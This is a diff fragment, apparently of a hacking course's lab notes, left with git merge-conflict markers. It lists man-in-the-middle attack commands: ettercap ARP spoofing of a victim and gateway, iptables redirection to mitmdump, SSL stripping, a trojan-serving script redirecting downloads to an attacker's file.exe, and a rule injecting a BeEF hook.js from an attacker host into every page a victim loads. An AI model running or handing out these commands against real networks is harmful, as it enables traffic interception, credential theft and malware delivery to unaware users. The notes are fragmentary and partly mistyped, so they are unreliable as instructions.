@@ -486,3 +486,42 @@ def request(flow):
        flow.response = mitmproxy.http.HTTPResponse.make(301, "",{"Location":"http://10.20.215.8/file.exe"})
 
 
+<<<<<<< HEAD
+=======
+v-76)
+
+25) ./mitmdump -s /root/basic.py --transparent
+
+26) ettercap -Tq -M arponeway -i eth0 -S /10.20.215.9// /10.20.215.1//
+
+27) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+v-77)
+
+28) 
+
+v-78)
+
+28) ./mitmdump -s /opt/TrojanFactory/mitmproxy_script.py --transparent
+
+29) ettercap -Tq -M arp:oneway -i eth0 -S /10.20.215.9// /10.20.215.1//
+
+30) iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+section-12)
+
+v-79)
+
+1) arp spoofing using ettercap
+
+2) mitmdump
+
+3) iptable rule
+
+4) ./mitmdump -s sslstrip.py -s /root/basic.py --transparent
+
+v-81)
+
+5) .mitmdump -s sslstrip.py --transparent --replace :~s"</body>":"<script src="http://10.20.215.8:3000/hook.js"></script> </BODY>"
+
+>>>>>>> 172339aa69987092cefd90bf5f3db0d4196ecb53
